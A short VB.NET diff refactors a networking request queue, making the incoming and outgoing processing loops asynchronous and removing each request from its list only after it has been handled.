@@ -1,6 +1,6 @@
 ﻿
 '       │ Author     : NYAN CAT
-'       │ Name       : Task scheduler
+'       │ Name       : Task scheduler \ Synchronously
 
 '       Contact Me   : https://github.com/NYAN-x-CAT
 
@@ -33,16 +33,16 @@ End Class
 
 Public Class Pending
     Public Shared Req_In As List(Of Incoming_Requests)
-    Public Shared Sub Incoming()
+    Public Shared Async Sub Incoming()
         While True
-            Threading.Thread.Sleep(1)
             Try
                 Dim ClientReq As Incoming_Requests = Nothing
                 If Req_In.Count > 0 Then
                     ClientReq = Req_In.Item(0)
-                    Req_In.Remove(ClientReq)
                     Messages.Read(ClientReq.C, ClientReq.B)
+                    Req_In.Remove(ClientReq)
                 End If
+                Await Task.Delay(1)
             Catch ex As Exception
                 Debug.WriteLine("Incoming " + ex.Message)
             End Try
@@ -50,16 +50,16 @@ Public Class Pending
     End Sub
 
     Public Shared Req_Out As List(Of Outcoming_Requests)
-    Public Shared Sub OutComing()
+    Public Shared Async Sub OutComing()
         While True
-            Threading.Thread.Sleep(1)
             Try
                 Dim ClientReq As Outcoming_Requests = Nothing
                 If Req_Out.Count > 0 Then
                     ClientReq = Req_Out.Item(0)
-                    Req_Out.Remove(ClientReq)
                     ClientReq.C.BeginSend(ClientReq.B)
+                    Req_Out.Remove(ClientReq)
                 End If
+                Await Task.Delay(1)
             Catch ex As Exception
                 Debug.WriteLine("OutComing " + ex.Message)
             End Try
